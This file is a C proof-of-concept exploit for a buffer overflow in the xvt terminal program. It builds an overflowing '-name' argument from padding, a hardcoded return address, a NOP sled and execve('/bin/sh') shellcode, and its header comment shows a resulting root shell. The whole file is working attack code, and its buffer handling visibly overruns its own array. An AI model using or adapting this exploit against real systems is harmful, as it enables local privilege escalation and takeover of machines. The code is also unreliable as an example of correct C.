/*

   /usr/bin/X11/xvt overflow proof of concept by cb@t-online.fr.

   tshaw:~$ ./expl
   bash#

*/

#include <stdio.h>
#include <stdlib.h>

int main()

{

    char buf[234];
    int i;

    char code[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


    for(i=0; i<76; i++)
        buf[i] = 0x41;

    *(long *)&buf[76]=0xbffffab0; /* ret addr */

    memset(buf + 80, 0x90, 234);
    memcpy(buf + 233 - strlen(code), code, strlen(code));

    buf[234] = '\0';

    execl("/usr/bin/X11/xvt", "xvt", "-name", buf, 0);                           

}
